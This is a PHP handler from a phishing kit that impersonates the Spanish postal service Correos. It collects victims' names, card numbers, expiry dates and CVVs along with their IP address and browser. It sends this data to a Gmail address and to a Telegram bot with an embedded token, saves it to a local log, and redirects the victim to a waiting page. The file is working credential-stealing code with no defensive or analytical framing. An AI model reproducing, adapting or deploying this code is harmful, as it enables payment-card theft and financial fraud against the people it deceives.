<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ CVV Correos ]-----++--\n";
$message .= "-------------- BY Nicolas LBAYED-----\n";
$message .= "first name : ".$_POST['fname']."\n";
$message .= "last name : ".$_POST['lname']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp date : ".$_POST['exp']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------BY Yagami Houda  ? ----------------------\n";
$subject = "CVV Correos [ " . $zabi . " ] ";
$email = "ayou4yuo@gmail.com";
mail($email,$subject,$message);
    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);
file_get_contents("https://api.telegram.org/bot1613181759:AAEk6Rw1JPAaLNfvK66U9zjP44eCZPfFeOo/SendMessage?chat_id=@ZER157D&text=" . urlencode($message)."" );
header("Location: ../wait/");?>
